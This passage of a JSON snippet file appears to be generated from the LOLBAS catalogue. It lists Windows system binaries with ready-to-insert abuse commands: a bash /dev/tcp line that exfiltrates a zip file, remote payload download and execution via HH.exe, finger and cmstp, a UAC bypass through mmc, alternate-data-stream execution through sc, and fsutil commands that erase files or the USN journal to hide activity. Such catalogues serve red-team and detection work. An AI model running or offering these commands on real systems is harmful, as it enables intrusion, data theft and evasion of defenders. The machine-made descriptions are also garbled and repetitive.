            "Ie4uinit.exe is Executes commands from a specially prepared ie4uinit.inf file.. it can Executes commands from a specially prepared ie4uinit.inf file., requires  privilege, category: Execute, it can be used for Get code execution by copy files to another location.",
            "",
            "```sh",
            "ie4uinit.exe -BaseSettings${0}",
            "```"
        ],
        "description": "Ie4uinit.exe is Executes commands from a specially prepared ie4uinit.inf file.. it can Executes commands from a specially prepared ie4uinit.inf file., requires  privilege, category: Execute, it can be used for Get code execution by copy files to another location."
    },
    "Sftp.exe Proxy execution of specified command, can be used as a defensive evasion. (lolbas)": {
        "prefix": "Sftp.exe",
        "body": [
            "Sftp.exe is sftp.exe is a Windows command-line utility that uses the Secure File Transfer Protocol (SFTP) to securely transfer files between a local machine and a remote server.. it can Spawns ssh.exe which in turn spawns the specified command line. See also this project's entry for ssh.exe., requires  privilege, category: Execute, it can be used for Proxy execution of specified command, can be used as a defensive evasion..",
            "",
            "```sh",
            "sftp -o ProxyCommand=\"{CMD}\" .${0}",
            "```"
        ],
        "description": "Sftp.exe is sftp.exe is a Windows command-line utility that uses the Secure File Transfer Protocol (SFTP) to securely transfer files between a local machine and a remote server.. it can Spawns ssh.exe which in turn spawns the specified command line. See also this project's entry for ssh.exe., requires  privilege, category: Execute, it can be used for Proxy execution of specified command, can be used as a defensive evasion.."
    },
    "lolbas Sftp.exe Proxy execution of specified command, can be used as a defensive evasion.": {
        "prefix": "lolbas Sftp.exe",
        "body": [
            "Sftp.exe is sftp.exe is a Windows command-line utility that uses the Secure File Transfer Protocol (SFTP) to securely transfer files between a local machine and a remote server.. it can Spawns ssh.exe which in turn spawns the specified command line. See also this project's entry for ssh.exe., requires  privilege, category: Execute, it can be used for Proxy execution of specified command, can be used as a defensive evasion..",
            "",
            "```sh",
            "sftp -o ProxyCommand=\"{CMD}\" .${0}",
            "```"
        ],
        "description": "Sftp.exe is sftp.exe is a Windows command-line utility that uses the Secure File Transfer Protocol (SFTP) to securely transfer files between a local machine and a remote server.. it can Spawns ssh.exe which in turn spawns the specified command line. See also this project's entry for ssh.exe., requires  privilege, category: Execute, it can be used for Proxy execution of specified command, can be used as a defensive evasion.."
    },
    "Fsutil.exe Can be used to forensically erase a file (lolbas)": {
        "prefix": "Fsutil.exe",
        "body": [
            "Fsutil.exe is File System Utility. it can Zero out a file, requires  privilege, category: Tamper, it can be used for Can be used to forensically erase a file.",
            "",
            "```sh",
            "fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE}${0}",
            "```"
        ],
        "description": "Fsutil.exe is File System Utility. it can Zero out a file, requires  privilege, category: Tamper, it can be used for Can be used to forensically erase a file."
    },
    "lolbas Fsutil.exe Can be used to forensically erase a file": {
        "prefix": "lolbas Fsutil.exe",
        "body": [
            "Fsutil.exe is File System Utility. it can Zero out a file, requires  privilege, category: Tamper, it can be used for Can be used to forensically erase a file.",
            "",
            "```sh",
            "fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE}${0}",
            "```"
        ],
        "description": "Fsutil.exe is File System Utility. it can Zero out a file, requires  privilege, category: Tamper, it can be used for Can be used to forensically erase a file."
    },
    "Fsutil.exe Can be used to hide file creation activity (lolbas)": {
        "prefix": "Fsutil.exe",
        "body": [
            "Fsutil.exe is File System Utility. it can Delete the USN journal volume to hide file creation activity, requires  privilege, category: Tamper, it can be used for Can be used to hide file creation activity.",
            "",
            "```sh",
            "fsutil.exe usn deletejournal /d c:${0}",
            "```"
        ],
        "description": "Fsutil.exe is File System Utility. it can Delete the USN journal volume to hide file creation activity, requires  privilege, category: Tamper, it can be used for Can be used to hide file creation activity."
    },
    "lolbas Fsutil.exe Can be used to hide file creation activity": {
        "prefix": "lolbas Fsutil.exe",
        "body": [
            "Fsutil.exe is File System Utility. it can Delete the USN journal volume to hide file creation activity, requires  privilege, category: Tamper, it can be used for Can be used to hide file creation activity.",
            "",
            "```sh",
            "fsutil.exe usn deletejournal /d c:${0}",
            "```"
        ],
        "description": "Fsutil.exe is File System Utility. it can Delete the USN journal volume to hide file creation activity, requires  privilege, category: Tamper, it can be used for Can be used to hide file creation activity."
    },
    "Fsutil.exe Spawn a pre-planted executable from fsutil.exe. (lolbas)": {
        "prefix": "Fsutil.exe",
        "body": [
            "Fsutil.exe is File System Utility. it can Executes a pre-planted binary named netsh.exe from the current directory., requires  privilege, category: Execute, it can be used for Spawn a pre-planted executable from fsutil.exe..",
            "",
            "```sh",
            "fsutil.exe trace decode${0}",
            "```"
        ],
        "description": "Fsutil.exe is File System Utility. it can Executes a pre-planted binary named netsh.exe from the current directory., requires  privilege, category: Execute, it can be used for Spawn a pre-planted executable from fsutil.exe.."
    },
    "lolbas Fsutil.exe Spawn a pre-planted executable from fsutil.exe.": {
        "prefix": "lolbas Fsutil.exe",
        "body": [
            "Fsutil.exe is File System Utility. it can Executes a pre-planted binary named netsh.exe from the current directory., requires  privilege, category: Execute, it can be used for Spawn a pre-planted executable from fsutil.exe..",
            "",
            "```sh",
            "fsutil.exe trace decode${0}",
            "```"
        ],
        "description": "Fsutil.exe is File System Utility. it can Executes a pre-planted binary named netsh.exe from the current directory., requires  privilege, category: Execute, it can be used for Spawn a pre-planted executable from fsutil.exe.."
    },
    "Sc.exe Execute binary file hidden inside an alternate data stream (lolbas)": {
        "prefix": "Sc.exe",
        "body": [
            "Sc.exe is Used by Windows to manage services. it can Modifies an existing service and executes the file stored in the ADS., requires  privilege, category: ADS, it can be used for Execute binary file hidden inside an alternate data stream.",
            "",
            "```sh",
            "sc config {ExistingServiceName} binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" & sc start {ExistingServiceName}${0}",
            "```"
        ],
        "description": "Sc.exe is Used by Windows to manage services. it can Modifies an existing service and executes the file stored in the ADS., requires  privilege, category: ADS, it can be used for Execute binary file hidden inside an alternate data stream."
    },
    "lolbas Sc.exe Execute binary file hidden inside an alternate data stream": {
        "prefix": "lolbas Sc.exe",
        "body": [
            "Sc.exe is Used by Windows to manage services. it can Modifies an existing service and executes the file stored in the ADS., requires  privilege, category: ADS, it can be used for Execute binary file hidden inside an alternate data stream.",
            "",
            "```sh",
            "sc config {ExistingServiceName} binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" & sc start {ExistingServiceName}${0}",
            "```"
        ],
        "description": "Sc.exe is Used by Windows to manage services. it can Modifies an existing service and executes the file stored in the ADS., requires  privilege, category: ADS, it can be used for Execute binary file hidden inside an alternate data stream."
    },
    "Conhost.exe Use conhost.exe as a proxy binary to evade defensive counter-measures (lolbas)": {
        "prefix": "Conhost.exe",
        "body": [
            "Conhost.exe is Console Window host. it can Execute a command line with conhost.exe as parent process, requires  privilege, category: Execute, it can be used for Use conhost.exe as a proxy binary to evade defensive counter-measures.",
            "",
            "```sh",
            "conhost.exe {CMD}${0}",
            "```"
        ],
        "description": "Conhost.exe is Console Window host. it can Execute a command line with conhost.exe as parent process, requires  privilege, category: Execute, it can be used for Use conhost.exe as a proxy binary to evade defensive counter-measures."
    },
    "lolbas Conhost.exe Use conhost.exe as a proxy binary to evade defensive counter-measures": {
        "prefix": "lolbas Conhost.exe",
        "body": [
            "Conhost.exe is Console Window host. it can Execute a command line with conhost.exe as parent process, requires  privilege, category: Execute, it can be used for Use conhost.exe as a proxy binary to evade defensive counter-measures.",
            "",
            "```sh",
            "conhost.exe {CMD}${0}",
            "```"
        ],
        "description": "Conhost.exe is Console Window host. it can Execute a command line with conhost.exe as parent process, requires  privilege, category: Execute, it can be used for Use conhost.exe as a proxy binary to evade defensive counter-measures."
    },
    "Conhost.exe Specify --headless parameter to hide child process window (if applicable) (lolbas)": {
        "prefix": "Conhost.exe",
        "body": [
            "Conhost.exe is Console Window host. it can Execute a command line with conhost.exe as parent process, requires  privilege, category: Execute, it can be used for Specify --headless parameter to hide child process window (if applicable).",
            "",
            "```sh",
            "conhost.exe --headless {CMD}${0}",
            "```"
        ],
        "description": "Conhost.exe is Console Window host. it can Execute a command line with conhost.exe as parent process, requires  privilege, category: Execute, it can be used for Specify --headless parameter to hide child process window (if applicable)."
    },
    "lolbas Conhost.exe Specify --headless parameter to hide child process window (if applicable)": {
        "prefix": "lolbas Conhost.exe",
        "body": [
            "Conhost.exe is Console Window host. it can Execute a command line with conhost.exe as parent process, requires  privilege, category: Execute, it can be used for Specify --headless parameter to hide child process window (if applicable).",
            "",
            "```sh",
            "conhost.exe --headless {CMD}${0}",
            "```"
        ],
        "description": "Conhost.exe is Console Window host. it can Execute a command line with conhost.exe as parent process, requires  privilege, category: Execute, it can be used for Specify --headless parameter to hide child process window (if applicable)."
    },
    "Bash.exe Performs execution of specified file, can be used as a defensive evasion. (lolbas)": {
        "prefix": "Bash.exe",
        "body": [
            "Bash.exe is File used by Windows subsystem for Linux. it can Exfiltrate data, requires  privilege, category: Execute, it can be used for Performs execution of specified file, can be used as a defensive evasion..",
            "",
            "```sh",
            "bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24'${0}",
            "```"
        ],
        "description": "Bash.exe is File used by Windows subsystem for Linux. it can Exfiltrate data, requires  privilege, category: Execute, it can be used for Performs execution of specified file, can be used as a defensive evasion.."
    },
    "lolbas Bash.exe Performs execution of specified file, can be used as a defensive evasion.": {
        "prefix": "lolbas Bash.exe",
        "body": [
            "Bash.exe is File used by Windows subsystem for Linux. it can Exfiltrate data, requires  privilege, category: Execute, it can be used for Performs execution of specified file, can be used as a defensive evasion..",
            "",
            "```sh",
            "bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24'${0}",
            "```"
        ],
        "description": "Bash.exe is File used by Windows subsystem for Linux. it can Exfiltrate data, requires  privilege, category: Execute, it can be used for Performs execution of specified file, can be used as a defensive evasion.."
    },
    "Bash.exe Performs execution of specified file, can be used to bypass Application Whitelisting. (lolbas)": {
        "prefix": "Bash.exe",
        "body": [
            "Bash.exe is File used by Windows subsystem for Linux. it can Executes executable from bash.exe, requires  privilege, category: AWL Bypass, it can be used for Performs execution of specified file, can be used to bypass Application Whitelisting..",
            "",
            "```sh",
            "bash.exe -c \"{CMD}\"${0}",
            "```"
        ],
        "description": "Bash.exe is File used by Windows subsystem for Linux. it can Executes executable from bash.exe, requires  privilege, category: AWL Bypass, it can be used for Performs execution of specified file, can be used to bypass Application Whitelisting.."
    },
    "lolbas Bash.exe Performs execution of specified file, can be used to bypass Application Whitelisting.": {
        "prefix": "lolbas Bash.exe",
        "body": [
            "Bash.exe is File used by Windows subsystem for Linux. it can Executes executable from bash.exe, requires  privilege, category: AWL Bypass, it can be used for Performs execution of specified file, can be used to bypass Application Whitelisting..",
            "",
            "```sh",
            "bash.exe -c \"{CMD}\"${0}",
            "```"
        ],
        "description": "Bash.exe is File used by Windows subsystem for Linux. it can Executes executable from bash.exe, requires  privilege, category: AWL Bypass, it can be used for Performs execution of specified file, can be used to bypass Application Whitelisting.."
    },
    "Hh.exe Download files from url (lolbas)": {
        "prefix": "Hh.exe",
        "body": [
            "Hh.exe is Binary used for processing chm files in Windows. it can Open the target batch script with HTML Help., requires  privilege, category: Download, it can be used for Download files from url.",
            "",
            "```sh",
            "HH.exe {REMOTEURL:.bat}${0}",
            "```"
        ],
        "description": "Hh.exe is Binary used for processing chm files in Windows. it can Open the target batch script with HTML Help., requires  privilege, category: Download, it can be used for Download files from url."
    },
    "lolbas Hh.exe Download files from url": {
        "prefix": "lolbas Hh.exe",
        "body": [
            "Hh.exe is Binary used for processing chm files in Windows. it can Open the target batch script with HTML Help., requires  privilege, category: Download, it can be used for Download files from url.",
            "",
            "```sh",
            "HH.exe {REMOTEURL:.bat}${0}",
            "```"
        ],
        "description": "Hh.exe is Binary used for processing chm files in Windows. it can Open the target batch script with HTML Help., requires  privilege, category: Download, it can be used for Download files from url."
    },
    "Hh.exe Execute process with HH.exe (lolbas)": {
        "prefix": "Hh.exe",
        "body": [
            "Hh.exe is Binary used for processing chm files in Windows. it can Executes specified executable with HTML Help., requires  privilege, category: Execute, it can be used for Execute process with HH.exe.",
            "",
            "```sh",
            "HH.exe {PATH_ABSOLUTE:.exe}${0}",
            "```"
        ],
        "description": "Hh.exe is Binary used for processing chm files in Windows. it can Executes specified executable with HTML Help., requires  privilege, category: Execute, it can be used for Execute process with HH.exe."
    },
    "lolbas Hh.exe Execute process with HH.exe": {
        "prefix": "lolbas Hh.exe",
        "body": [
            "Hh.exe is Binary used for processing chm files in Windows. it can Executes specified executable with HTML Help., requires  privilege, category: Execute, it can be used for Execute process with HH.exe.",
            "",
            "```sh",
            "HH.exe {PATH_ABSOLUTE:.exe}${0}",
            "```"
        ],
        "description": "Hh.exe is Binary used for processing chm files in Windows. it can Executes specified executable with HTML Help., requires  privilege, category: Execute, it can be used for Execute process with HH.exe."
    },
    "Hh.exe Execute commands with HH.exe (lolbas)": {
        "prefix": "Hh.exe",
        "body": [
            "Hh.exe is Binary used for processing chm files in Windows. it can Executes a remote .chm file which can contain commands., requires  privilege, category: Execute, it can be used for Execute commands with HH.exe.",
            "",
            "```sh",
            "HH.exe {REMOTEURL:.chm}${0}",
            "```"
        ],
        "description": "Hh.exe is Binary used for processing chm files in Windows. it can Executes a remote .chm file which can contain commands., requires  privilege, category: Execute, it can be used for Execute commands with HH.exe."
    },
    "lolbas Hh.exe Execute commands with HH.exe": {
        "prefix": "lolbas Hh.exe",
        "body": [
            "Hh.exe is Binary used for processing chm files in Windows. it can Executes a remote .chm file which can contain commands., requires  privilege, category: Execute, it can be used for Execute commands with HH.exe.",
            "",
            "```sh",
            "HH.exe {REMOTEURL:.chm}${0}",
            "```"
        ],
        "description": "Hh.exe is Binary used for processing chm files in Windows. it can Executes a remote .chm file which can contain commands., requires  privilege, category: Execute, it can be used for Execute commands with HH.exe."
    },
    "SettingSyncHost.exe Can be used to evade defensive countermeasures or to hide as a persistence mechanism (lolbas)": {
        "prefix": "SettingSyncHost.exe",
        "body": [
            "SettingSyncHost.exe is Host Process for Setting Synchronization. it can Execute file specified in %COMSPEC%, requires  privilege, category: Execute, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism.",
            "",
            "```sh",
            "SettingSyncHost -LoadAndRunDiagScript {PATH:.exe}${0}",
            "```"
        ],
        "description": "SettingSyncHost.exe is Host Process for Setting Synchronization. it can Execute file specified in %COMSPEC%, requires  privilege, category: Execute, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism."
    },
    "lolbas SettingSyncHost.exe Can be used to evade defensive countermeasures or to hide as a persistence mechanism": {
        "prefix": "lolbas SettingSyncHost.exe",
        "body": [
            "SettingSyncHost.exe is Host Process for Setting Synchronization. it can Execute file specified in %COMSPEC%, requires  privilege, category: Execute, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism.",
            "",
            "```sh",
            "SettingSyncHost -LoadAndRunDiagScript {PATH:.exe}${0}",
            "```"
        ],
        "description": "SettingSyncHost.exe is Host Process for Setting Synchronization. it can Execute file specified in %COMSPEC%, requires  privilege, category: Execute, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism."
    },
    "SettingSyncHost.exe Can be used to evade defensive countermeasures or to hide as a persistence mechanism. Additionally, effectively act as a -WindowStyle Hidden option (as there is in PowerShell) for any arbitrary batch file. (lolbas)": {
        "prefix": "SettingSyncHost.exe",
        "body": [
            "SettingSyncHost.exe is Host Process for Setting Synchronization. it can Execute a batch script in the background (no window ever pops up) which can be subverted to running arbitrary programs by setting the current working directory to %TMP% and creating files such as reg.bat/reg.exe in that directory thereby causing them to execute instead of the ones in C:\\Windows\\System32., requires  privilege, category: Execute, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism. Additionally, effectively act as a -WindowStyle Hidden option (as there is in PowerShell) for any arbitrary batch file..",
            "",
            "```sh",
            "SettingSyncHost -LoadAndRunDiagScriptNoCab {PATH:.bat}${0}",
            "```"
        ],
        "description": "SettingSyncHost.exe is Host Process for Setting Synchronization. it can Execute a batch script in the background (no window ever pops up) which can be subverted to running arbitrary programs by setting the current working directory to %TMP% and creating files such as reg.bat/reg.exe in that directory thereby causing them to execute instead of the ones in C:\\Windows\\System32., requires  privilege, category: Execute, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism. Additionally, effectively act as a -WindowStyle Hidden option (as there is in PowerShell) for any arbitrary batch file.."
    },
    "lolbas SettingSyncHost.exe Can be used to evade defensive countermeasures or to hide as a persistence mechanism. Additionally, effectively act as a -WindowStyle Hidden option (as there is in PowerShell) for any arbitrary batch file.": {
        "prefix": "lolbas SettingSyncHost.exe",
        "body": [
            "SettingSyncHost.exe is Host Process for Setting Synchronization. it can Execute a batch script in the background (no window ever pops up) which can be subverted to running arbitrary programs by setting the current working directory to %TMP% and creating files such as reg.bat/reg.exe in that directory thereby causing them to execute instead of the ones in C:\\Windows\\System32., requires  privilege, category: Execute, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism. Additionally, effectively act as a -WindowStyle Hidden option (as there is in PowerShell) for any arbitrary batch file..",
            "",
            "```sh",
            "SettingSyncHost -LoadAndRunDiagScriptNoCab {PATH:.bat}${0}",
            "```"
        ],
        "description": "SettingSyncHost.exe is Host Process for Setting Synchronization. it can Execute a batch script in the background (no window ever pops up) which can be subverted to running arbitrary programs by setting the current working directory to %TMP% and creating files such as reg.bat/reg.exe in that directory thereby causing them to execute instead of the ones in C:\\Windows\\System32., requires  privilege, category: Execute, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism. Additionally, effectively act as a -WindowStyle Hidden option (as there is in PowerShell) for any arbitrary batch file.."
    },
    "Finger.exe Download malicious payload (lolbas)": {
        "prefix": "Finger.exe",
        "body": [
            "Finger.exe is Displays information about a user or users on a specified remote computer that is running the Finger service or daemon. it can Downloads payload from remote Finger server. This example connects to \"example.host.com\" asking for user \"user\"; the result could contain malicious shellcode which is executed by the cmd process., requires  privilege, category: Download, it can be used for Download malicious payload.",
            "",
            "```sh",
            "finger user@example.host.com | more +2 | cmd${0}",
            "```"
        ],
        "description": "Finger.exe is Displays information about a user or users on a specified remote computer that is running the Finger service or daemon. it can Downloads payload from remote Finger server. This example connects to \"example.host.com\" asking for user \"user\"; the result could contain malicious shellcode which is executed by the cmd process., requires  privilege, category: Download, it can be used for Download malicious payload."
    },
    "lolbas Finger.exe Download malicious payload": {
        "prefix": "lolbas Finger.exe",
        "body": [
            "Finger.exe is Displays information about a user or users on a specified remote computer that is running the Finger service or daemon. it can Downloads payload from remote Finger server. This example connects to \"example.host.com\" asking for user \"user\"; the result could contain malicious shellcode which is executed by the cmd process., requires  privilege, category: Download, it can be used for Download malicious payload.",
            "",
            "```sh",
            "finger user@example.host.com | more +2 | cmd${0}",
            "```"
        ],
        "description": "Finger.exe is Displays information about a user or users on a specified remote computer that is running the Finger service or daemon. it can Downloads payload from remote Finger server. This example connects to \"example.host.com\" asking for user \"user\"; the result could contain malicious shellcode which is executed by the cmd process., requires  privilege, category: Download, it can be used for Download malicious payload."
    },
    "Cmstp.exe Execute code hidden within an inf file. Download and run scriptlets from internet. (lolbas)": {
        "prefix": "Cmstp.exe",
        "body": [
            "Cmstp.exe is Installs or removes a Connection Manager service profile.. it can Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll., requires  privilege, category: Execute, it can be used for Execute code hidden within an inf file. Download and run scriptlets from internet..",
            "",
            "```sh",
            "cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}${0}",
            "```"
        ],
        "description": "Cmstp.exe is Installs or removes a Connection Manager service profile.. it can Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll., requires  privilege, category: Execute, it can be used for Execute code hidden within an inf file. Download and run scriptlets from internet.."
    },
    "lolbas Cmstp.exe Execute code hidden within an inf file. Download and run scriptlets from internet.": {
        "prefix": "lolbas Cmstp.exe",
        "body": [
            "Cmstp.exe is Installs or removes a Connection Manager service profile.. it can Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll., requires  privilege, category: Execute, it can be used for Execute code hidden within an inf file. Download and run scriptlets from internet..",
            "",
            "```sh",
            "cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}${0}",
            "```"
        ],
        "description": "Cmstp.exe is Installs or removes a Connection Manager service profile.. it can Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll., requires  privilege, category: Execute, it can be used for Execute code hidden within an inf file. Download and run scriptlets from internet.."
    },
    "Cmstp.exe Execute code hidden within an inf file. Execute code directly from Internet. (lolbas)": {
        "prefix": "Cmstp.exe",
        "body": [
            "Cmstp.exe is Installs or removes a Connection Manager service profile.. it can Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll., requires  privilege, category: AWL Bypass, it can be used for Execute code hidden within an inf file. Execute code directly from Internet..",
            "",
            "```sh",
            "cmstp.exe /ni /s {REMOTEURL:.inf}${0}",
            "```"
        ],
        "description": "Cmstp.exe is Installs or removes a Connection Manager service profile.. it can Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll., requires  privilege, category: AWL Bypass, it can be used for Execute code hidden within an inf file. Execute code directly from Internet.."
    },
    "lolbas Cmstp.exe Execute code hidden within an inf file. Execute code directly from Internet.": {
        "prefix": "lolbas Cmstp.exe",
        "body": [
            "Cmstp.exe is Installs or removes a Connection Manager service profile.. it can Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll., requires  privilege, category: AWL Bypass, it can be used for Execute code hidden within an inf file. Execute code directly from Internet..",
            "",
            "```sh",
            "cmstp.exe /ni /s {REMOTEURL:.inf}${0}",
            "```"
        ],
        "description": "Cmstp.exe is Installs or removes a Connection Manager service profile.. it can Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll., requires  privilege, category: AWL Bypass, it can be used for Execute code hidden within an inf file. Execute code directly from Internet.."
    },
    "Mmc.exe Configure a snap-in to load a COM custom class (CLSID) that has been added to the registry (lolbas)": {
        "prefix": "Mmc.exe",
        "body": [
            "Mmc.exe is Load snap-ins to locally and remotely manage Windows systems. it can Launch a 'backgrounded' MMC process and invoke a COM payload, requires  privilege, category: Execute, it can be used for Configure a snap-in to load a COM custom class (CLSID) that has been added to the registry.",
            "",
            "```sh",
            "mmc.exe -Embedding {PATH_ABSOLUTE:.msc}${0}",
            "```"
        ],
        "description": "Mmc.exe is Load snap-ins to locally and remotely manage Windows systems. it can Launch a 'backgrounded' MMC process and invoke a COM payload, requires  privilege, category: Execute, it can be used for Configure a snap-in to load a COM custom class (CLSID) that has been added to the registry."
    },
    "lolbas Mmc.exe Configure a snap-in to load a COM custom class (CLSID) that has been added to the registry": {
        "prefix": "lolbas Mmc.exe",
        "body": [
            "Mmc.exe is Load snap-ins to locally and remotely manage Windows systems. it can Launch a 'backgrounded' MMC process and invoke a COM payload, requires  privilege, category: Execute, it can be used for Configure a snap-in to load a COM custom class (CLSID) that has been added to the registry.",
            "",
            "```sh",
            "mmc.exe -Embedding {PATH_ABSOLUTE:.msc}${0}",
            "```"
        ],
        "description": "Mmc.exe is Load snap-ins to locally and remotely manage Windows systems. it can Launch a 'backgrounded' MMC process and invoke a COM payload, requires  privilege, category: Execute, it can be used for Configure a snap-in to load a COM custom class (CLSID) that has been added to the registry."
    },
    "Mmc.exe Modify HKCU\\Environment key in Registry with COR profiler values then launch MMC to load the payload DLL. (lolbas)": {
        "prefix": "Mmc.exe",
        "body": [
            "Mmc.exe is Load snap-ins to locally and remotely manage Windows systems. it can Load an arbitrary payload DLL by configuring COR Profiler registry settings and launching MMC to bypass UAC., requires  privilege, category: UAC Bypass, it can be used for Modify HKCU\\Environment key in Registry with COR profiler values then launch MMC to load the payload DLL..",
            "",
            "```sh",
            "mmc.exe gpedit.msc${0}",
            "```"
        ],
        "description": "Mmc.exe is Load snap-ins to locally and remotely manage Windows systems. it can Load an arbitrary payload DLL by configuring COR Profiler registry settings and launching MMC to bypass UAC., requires  privilege, category: UAC Bypass, it can be used for Modify HKCU\\Environment key in Registry with COR profiler values then launch MMC to load the payload DLL.."
    },
    "lolbas Mmc.exe Modify HKCU\\Environment key in Registry with COR profiler values then launch MMC to load the payload DLL.": {
        "prefix": "lolbas Mmc.exe",
        "body": [
            "Mmc.exe is Load snap-ins to locally and remotely manage Windows systems. it can Load an arbitrary payload DLL by configuring COR Profiler registry settings and launching MMC to bypass UAC., requires  privilege, category: UAC Bypass, it can be used for Modify HKCU\\Environment key in Registry with COR profiler values then launch MMC to load the payload DLL..",
            "",
            "```sh",
            "mmc.exe gpedit.msc${0}",
            "```"
        ],
        "description": "Mmc.exe is Load snap-ins to locally and remotely manage Windows systems. it can Load an arbitrary payload DLL by configuring COR Profiler registry settings and launching MMC to bypass UAC., requires  privilege, category: UAC Bypass, it can be used for Modify HKCU\\Environment key in Registry with COR profiler values then launch MMC to load the payload DLL.."
    },
    "Mmc.exe Download file from Internet (lolbas)": {
        "prefix": "Mmc.exe",
        "body": [
            "Mmc.exe is Load snap-ins to locally and remotely manage Windows systems. it can Download and save an executable to disk, requires  privilege, category: Download, it can be used for Download file from Internet.",
            "",
            "```sh",
            "mmc.exe -Embedding {PATH_ABSOLUTE:.msc}${0}",
            "```"
        ],
        "description": "Mmc.exe is Load snap-ins to locally and remotely manage Windows systems. it can Download and save an executable to disk, requires  privilege, category: Download, it can be used for Download file from Internet."
    },
    "lolbas Mmc.exe Download file from Internet": {
        "prefix": "lolbas Mmc.exe",
        "body": [
            "Mmc.exe is Load snap-ins to locally and remotely manage Windows systems. it can Download and save an executable to disk, requires  privilege, category: Download, it can be used for Download file from Internet.",
            "",
            "```sh",
            "mmc.exe -Embedding {PATH_ABSOLUTE:.msc}${0}",
            "```"
        ],
        "description": "Mmc.exe is Load snap-ins to locally and remotely manage Windows systems. it can Download and save an executable to disk, requires  privilege, category: Download, it can be used for Download file from Internet."
    },
    "Jsc.exe Compile attacker code on system. Bypass defensive counter measures. (lolbas)": {
        "prefix": "Jsc.exe",
        "body": [
            "Jsc.exe is Binary file used by .NET to compile JavaScript code to .exe or .dll format. it can Use jsc.exe to compile JavaScript code stored in the .JS file and generate a DLL file with the same name., requires  privilege, category: Compile, it can be used for Compile attacker code on system. Bypass defensive counter measures..",
            "",
            "```sh",
            "jsc.exe /t:library {PATH:.js}${0}",
            "```"
        ],
        "description": "Jsc.exe is Binary file used by .NET to compile JavaScript code to .exe or .dll format. it can Use jsc.exe to compile JavaScript code stored in the .JS file and generate a DLL file with the same name., requires  privilege, category: Compile, it can be used for Compile attacker code on system. Bypass defensive counter measures.."
    },
    "lolbas Jsc.exe Compile attacker code on system. Bypass defensive counter measures.": {
        "prefix": "lolbas Jsc.exe",
        "body": [
            "Jsc.exe is Binary file used by .NET to compile JavaScript code to .exe or .dll format. it can Use jsc.exe to compile JavaScript code stored in the .JS file and generate a DLL file with the same name., requires  privilege, category: Compile, it can be used for Compile attacker code on system. Bypass defensive counter measures..",
            "",
            "```sh",
            "jsc.exe /t:library {PATH:.js}${0}",
            "```"
        ],
        "description": "Jsc.exe is Binary file used by .NET to compile JavaScript code to .exe or .dll format. it can Use jsc.exe to compile JavaScript code stored in the .JS file and generate a DLL file with the same name., requires  privilege, category: Compile, it can be used for Compile attacker code on system. Bypass defensive counter measures.."
    },
    "ConfigSecurityPolicy.exe Upload file (lolbas)": {
        "prefix": "ConfigSecurityPolicy.exe",
        "body": [
            "ConfigSecurityPolicy.exe is Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.. it can Upload file, credentials or data exfiltration in general, requires  privilege, category: Upload, it can be used for Upload file.",
            "",
            "```sh",
            "ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}${0}",
            "```"
        ],
        "description": "ConfigSecurityPolicy.exe is Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.. it can Upload file, credentials or data exfiltration in general, requires  privilege, category: Upload, it can be used for Upload file."
    },
    "lolbas ConfigSecurityPolicy.exe Upload file": {
        "prefix": "lolbas ConfigSecurityPolicy.exe",
        "body": [
            "ConfigSecurityPolicy.exe is Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.. it can Upload file, credentials or data exfiltration in general, requires  privilege, category: Upload, it can be used for Upload file.",
            "",
            "```sh",
            "ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}${0}",
            "```"
        ],
        "description": "ConfigSecurityPolicy.exe is Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.. it can Upload file, credentials or data exfiltration in general, requires  privilege, category: Upload, it can be used for Upload file."
    },
    "ConfigSecurityPolicy.exe Downloads payload from remote server (lolbas)": {
        "prefix": "ConfigSecurityPolicy.exe",
        "body": [
